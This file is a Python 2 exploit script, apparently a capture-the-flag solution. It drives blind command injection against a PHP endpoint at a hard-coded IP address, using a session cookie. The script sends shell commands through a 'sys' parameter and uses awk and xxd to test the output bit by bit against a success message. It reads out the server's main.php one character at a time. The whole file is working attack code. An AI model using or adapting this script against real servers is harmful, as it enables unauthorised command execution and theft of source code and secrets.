# -*- coding:utf-8 -*-
import requests,string,sys
def cmd(c):
  URL = "http://1.224.175.32:17780/sundae/ahffkdy3399system.php"
  data = {"sys":c}
  cookies = {"PHPSESSID":"sc9gt39bhf14n6huqcfd0d98b0"}
  while True:
    r= requests.post(URL,data = data, cookies = cookies)
    if "정상적으로 실행되었습니다.".decode("utf-8") in r.text:
      return True
    return False


#awk "NR == 1 {print substr(\$0,0,1)}" ./a.py
#[ $(awk "NR == 1 {print substr(\$0,0,1)}" ./ahffkdy3399system.php) = "i" ] && echo 1 || echo 1
nono="\"%'\\^`"
def check_line(command,line,n):
  ret = ""
  for x in range(8):
    #if x in nono:
    #  continue
    #c = """[ $(awk "NR == %d {print substr(\$0,%d,1)}" %s) = $(printf \\\\"%s") ] && echo 1 || asdfsdf"""%(line,n,fname,xx)
    c = """[ $(%s | awk "NR == %d {print \$1}"  | awk "NR == 1 {print substr(\$0,%d,1)}" | xxd -b | awk "NR ==1 {print substr(\$0,%d,1)}") = 0 ] && echo 1 || asdfsdf"""%(command, line, n,x+11)
    if cmd(c):
      ret += "0"
    else:
      ret += "1"
  print ret
  return chr(int(ret,2))

data = ""
for line in range(1,100):
  for idx in range(0,100):
    tmp=check_line("cat ./main.php",line,idx)
    data += tmp
    print data
